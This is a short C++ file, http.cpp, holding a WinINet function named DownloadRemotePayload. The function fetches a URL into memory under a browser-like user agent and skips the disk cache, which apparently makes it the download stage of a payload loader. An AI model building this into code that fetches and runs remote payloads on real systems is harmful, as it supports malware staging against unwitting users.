// http.cpp
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <iostream>

#pragma comment(lib, "wininet.lib")

bool DownloadRemotePayload(const std::string& url, std::vector<BYTE>& outBuffer) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        outBuffer.insert(outBuffer.end(), buffer, buffer + bytesRead);
        bytesRead = 0;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return !outBuffer.empty();
}
